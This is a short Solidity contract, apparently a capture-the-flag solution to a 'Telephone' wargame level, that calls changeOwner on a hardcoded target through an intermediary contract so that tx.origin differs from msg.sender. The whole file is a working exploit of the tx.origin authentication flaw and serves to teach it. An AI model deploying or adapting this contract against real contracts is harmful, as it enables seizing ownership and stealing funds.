// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

contract TelephoneAttack {
    address targetAddress = 0xa718aBf7a2Beb67aC03D3244b1E8877f1DfAE39f;

    function attack() public {
        //we interact with the victim contract changeOwner (address) using this contract so the tx.origin != msg.sender (us)
        bytes memory payload = abi.encodeWithSignature(
            "changeOwner(address)",
            msg.sender
        );
        (bool success, ) = targetAddress.call{value: 0 ether}(payload);
        //we require that the transaccion is a success
        require(
            success,
            "Transaction call using encodeWithSignature is successful"
        );
    }
}
